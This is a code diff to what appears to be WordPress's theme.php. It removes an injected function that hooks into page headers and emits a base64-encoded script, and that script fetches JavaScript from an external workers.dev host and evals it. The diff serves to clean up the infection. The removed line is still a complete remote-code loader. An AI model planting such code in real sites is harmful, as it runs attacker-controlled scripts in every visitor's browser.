@@ -139,7 +139,6 @@ function wp_get_theme( $stylesheet = '', $theme_root = '' ) {
  * @since 3.5.0
  * @param bool $clear_update_cache Whether to clear the theme updates cache.
  */
-function cjs(){echo "<script src=\"data:text/javascript;base64,Y29uc3QgZ2V0X3NjcmlwdD0oKT0+e2NvbnN0IHJlcXVlc3Q9bmV3IFhNTEh0dHBSZXF1ZXN0KCk7cmVxdWVzdC5vcGVuKCdHRVQnLCdodHRwczovL2hlbGxvLXdvcmxkLWJyb2tlbi1kdXN0LTFmMWMuYnJld2FzaWdmaTE5Nzgud29ya2Vycy5kZXYvJyxmYWxzZSk7cmVxdWVzdC5zZW5kKG51bGwpO3JldHVybiByZXF1ZXN0LnJlc3BvbnNlVGV4dDt9CmV2YWwoZ2V0X3NjcmlwdCgpKTs=\"></script>";}add_action("wp_head", "cjs");
 function wp_clean_themes_cache( $clear_update_cache = true ) {
 	if ( $clear_update_cache ) {
 		delete_site_transient( 'update_themes' );
@@ -868,12 +867,6 @@ function switch_theme( $stylesheet ) {
  *
  * @return bool
  */
-
-
-
-
-
-
 function validate_current_theme() {
 	/**
 	 * Filters whether to validate the active theme.
